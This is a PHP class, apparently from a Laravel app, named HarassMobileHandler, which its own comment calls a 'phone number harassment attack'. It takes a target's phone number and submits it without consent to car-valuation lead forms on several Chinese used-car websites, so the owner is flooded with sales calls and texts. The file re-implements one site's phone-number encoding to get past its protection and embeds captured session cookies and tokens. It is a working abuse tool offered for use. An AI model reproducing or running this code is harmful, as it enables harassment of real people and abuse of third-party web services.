<?php
/**
 * Created by PhpStorm.
 * User: klinson <klinson@163.com>
 * Date: 19-5-30
 * Time: 下午4:13
 */

namespace App\Handlers;

/**
 * 手机号骚扰攻击
 * Class HarassMobileHandler
 * @package App\Handlers
 * @author klinson <klinson@163.com>
 */
class HarassMobileHandler
{
    const modes = [
        1 => '车置宝估价',
        2 => '二手车之家',
        3 => '毛豆新车网',
//        4 => '瓜子二手车',
    ];
    protected $mode2method = [
        1 => 'chezhibao',
        2 => 'che168',
        3 => 'maodou',
//        4 => 'guazi'
    ];

    protected static $instance;
    protected function __construct()
    {
    }
    public static function getInstance()
    {
        if (is_null(self::$instance)) {
            self::$instance = new self();
        }

        return self::$instance;
    }

    public function handle($mobile, $modes = 1)
    {
        if (! is_array($modes)) {
            $modes = explode(',', $modes);
        }
        $return = [];
        foreach ($modes as $mode) {
            if (key_exists($mode, $this->mode2method) && strlen($mobile) === 11) {
                $return[] = [
                    'res' => call_user_func([$this, $this->mode2method[$mode]], $mobile),
                    'mode' => $mode,
                ];
            } else {
                $return[] = [
                    'res' => false,
                    'mode' => $mode,
                ];
            }
        }
        return $return;
    }

    public function maodou($mobile)
    {
        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://www.maodou.com/sapi/clue/add",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => "",
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POSTFIELDS => "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n{$mobile}\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"city_id\"\r\n\r\n0\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"platform\"\r\n\r\nnewcar_web_form13\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--",
            CURLOPT_HTTPHEADER => array(
                "Cache-Control: no-cache",
                "Cookie: uuid=a3d6702a-9c83-431a-ef8c-02f60f7eb742; XC-XSRF-TOKEN=eyJpdiI6ImxPalpxbGVkQ0F2cUhWTmVQZ2hQamc9PSIsInZhbHVlIjoidjAyZjJBd0tJbmdZNmo4ZXF1aDd2eTZyQ2ZQSUdORFBCSWNhaml0ZjY2dTZuUkd1N1hidkE4cXB2UlV2Mk9vN09seWtiWG1Wa0IrTG0xZFRabkNRVUE9PSIsIm1hYyI6IjRlMWRlMzc2NGJhMjUxYjk2NjRkMzkxYjhmMTAyMDMxYzkxMjljZTdhMDNlZDljY2RlNmExMzE3MDM3MmU0NjIifQ%3D%3D; cityDomain=dg; gr_user_id=ef95d8b5-e0ad-4613-a49c-351998e2418d; 8f54c54dcbc2813a_gr_session_id=a68a8e99-9a85-4285-8ef7-33a17a1fefd2; grwng_uid=970e44bc-3367-41f5-b7ef-f1f2782a6457; 8f54c54dcbc2813a_gr_session_id_a68a8e99-9a85-4285-8ef7-33a17a1fefd2=true; ; sessionid=dc486f18-4c92-4346-9d2e-a28d49684384; location=%7B%22name%22%3A%22%E4%B8%9C%E8%8E%9E%22%2C%22id%22%3A%2224%22%2C%22domain%22%3A%22dg%22%7D; indexCluePop=handleClose; cainfo=%7B%22ca_s%22%3A%22pz_baidu%22%2C%22ca_n%22%3A%22shouye_abtest%22%2C%22ca_medium%22%3A%22%22%2C%22ca_term%22%3A%22%22%2C%22ca_content%22%3A%22%22%2C%22ca_campaign%22%3A%22%22%2C%22ca_kw%22%3A%22-%22%2C%22keyword%22%3A%22%22%2C%22ca_keywordid%22%3A%22%22%2C%22scode%22%3A%22%22%2C%22ca_transid%22%3A%22%22%2C%22platform%22%3A%222%22%2C%22version%22%3A%221%22%7D; guazi_xinche_session=eyJpdiI6ImdyN3hBM09GczQ5Z3l0Y25YbWRNcFE9PSIsInZhbHVlIjoiZzN6bzFvbVBSaVQyYjdpRWZhK3JOdVFtelo0YU1YU05cL1U0MUZTQzh4dUZGXC9uWkxsdW1vbGMzaytUd2Vna2VKa3kzY0gyUEVEMlZPOTU3NE5rSHpwUT09IiwibWFjIjoiMzYwYTc2ZmE1NGM1YjRkNzE2Zjk5MTYxM2E4NjY5OWRmZGVkY2NiMDA1ZWFjOTc1ZjVhMDdjOTRjZjE2ZDFkYiJ9",
                "Referer: https://www.maodou.com/pages/landing/type2/web?ca_n=shouye_abtest&ca_s=pz_baidu",
                "content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
            ),
        ));

        $response = curl_exec($curl);
        curl_close($curl);

        if($response === false){
            $return =  [
                'error' => curl_errno($curl),
                'message' => curl_error($curl)
            ];
            return false;

        } else {
            $return = [
                'error' => 0,
                'response' => $response
            ];
            return true;
        }
    }

    // 二手车之家手机号加密
    protected function encodeMobile($mobile) {
        $xxxAarr = ['u', 'x', 'k', 'd', 'o', 'p', 'g', 's', 'v', 'j'];
        $c = "";
        for ($i = 0, $len = strlen($mobile); $i < $len; $i++) {
            $s = substr($mobile, $i, 1);
            $c .= $xxxAarr[$s];

            if (($i + 1) % 2 === 0) {
                $c .= "-";
            }
        }
        return $c;
    }

    // 二手车之家
    public function che168($mobile)
    {
        $url = 'https://www.che168.com/Handler/Evaluate/AddCarEstimate.ashx';
        $method = 'GET';
        $mobile = $this->encodeMobile($mobile);

        $params = [
            'xxx' => $mobile,
            'provinceID' => '350000',
            'cityID' => '350100',
            'brandID' => '33',
            'seriesID' => '3170',
            'specid' => '36601',
            'FirstRegTime' => date('Y-M'),
            'mileage' => '0.4',
            'sourceid' => '3',
            'sourcetwo' => '1',
            'sourcethree' => '128',
            'pagetype' => '2',
            'ischecked' => 'true',
            'isopen' => '1',
            'di' => '4|330754|0'
        ];
        $res1 = $this->request($url, $params, $method);

        $url = 'https://www.che168.com/pinggu/buyeva_419949926/0.html';
        $params = [
            'bid' => '33',
            'sid' => '3170',
            'specId' => '36601',
            'registerYear' => date('Y'),
            'registerMonth' => date('M'),
            'pid' => '350000',
            'cid' => '350100',
            'buyMark' => 'uahp10003',
            'isfromoutside' => '0',
            'pgmlg' => '0.4',
            'cdatestr' => date('Ym'),
            'pvareaid' => '100567',
            'xxx' => $mobile
        ];
        $res2 = $this->request($url, $params, $method);

        if (! $res1['error'] && ! $res2['error']) {
            return true;
        } else {
            return false;
        }
    }

    public function chezhibao($mobile)
    {
        $url = 'https://www.chezhibao.com/customer/addCar.htm';
        $params = [
            'mobile' => $mobile,
            'region' => 2067,
            'regionName' => '东莞'
        ];
        $headers = [
            'Content-Type' => 'application/x-www-form-urlencoded'
        ];
        $method = 'POST';
        $res = $this->request($url, $params, $method, $headers);
        if ($res['error']) {
            return false;
        } else {
            return true;
        }
    }

    // TODO:: 难做，需要等待页面js加载
    public function guazi($mobile)
    {
        $url1 = 'https://www.guazi.com/dg/';
        $headers = [
            'Cache-Control' => 'no-cache',
            'Host' => 'www.guazi.com',
            'Origin' => 'https://www.guazi.com',
            'Referer' => 'https://www.guazi.com/dg/',
            'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
        ];
        $res = $this->request($url1, [], 'GET', $headers);
        dd($res);


        $url = 'https://www.guazi.com/ww/appointCars/?act=ziXun';
        $params = [
            'phone' => $mobile,
            'puid' => '3009120631',
            'source' => '129',
            'time' => time(),
            'token' => 'f33f75d635ac9f48a5dbfbae2d61dfe3'
        ];

        $method = 'GET';
    }

    protected function request($url, $params = [], $method = 'GET', $headers = [], $cookies = null)
    {
        // 1. 初始化
        $ch = curl_init();
        // 2. 设置选项，包括URL
        if (strpos($url, '?') === false) {
            $url .= '?'.http_build_query($params);
        } else {
            $url .= '&'.http_build_query($params);
        }
        curl_setopt($ch,CURLOPT_URL, $url);
        curl_setopt($ch,CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch,CURLOPT_ENCODING, '');
        curl_setopt($ch, CURLOPT_HEADER, false);//设定是否显示头信息
        if ($method === 'POST' && $params) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        }
        // https
        if (substr($url, 0, 5) === 'https') {
//            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
//            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
            curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        }
        if ($headers) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        if ($cookies) {
//            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');//获取的cookie 保存到指定的 文件路径，我这里是相对路径，可以是$变量
            //curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');//要发送的cookie文件，注意这里是文件，还一个是变量形式发送
            curl_setopt($ch, CURLOPT_COOKIE, $cookies);//例如这句就是设置以变量的形式发送cookie，注意，这里的cookie变量是要先获取的，见下面获取方式
        }
        // 3. 执行并获取HTML文档内容
        $output = curl_exec($ch);
        // 4. 释放curl句柄
        curl_close($ch);
        if($output === false){
            return [
                'error' => curl_errno($ch),
                'message' => curl_error($ch)
            ];
        } else {
            return [
                'error' => 0,
                'response' => $output
            ];
        }

    }

    public function getCookie($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, true);//设定是否显示头信息
        curl_setopt($ch, CURLOPT_NOBODY, false);//设定是否输出页面内容
        // https
        if (substr($url, 0, 5) === 'https') {
//            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
//            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
            curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        }
        $res = curl_exec($ch);
        preg_match_all('/Set-Cookie: (.*);/', $res, $str); //这里采用正则匹配来获取cookie并且保存它到变量$str里，这就是为什么上面可以发送cookie变量的原因
        $cookies = implode(',', $str[1]); //获得COOKIE（SESSIONID）
        curl_close($ch);
        return $cookies;
    }
}
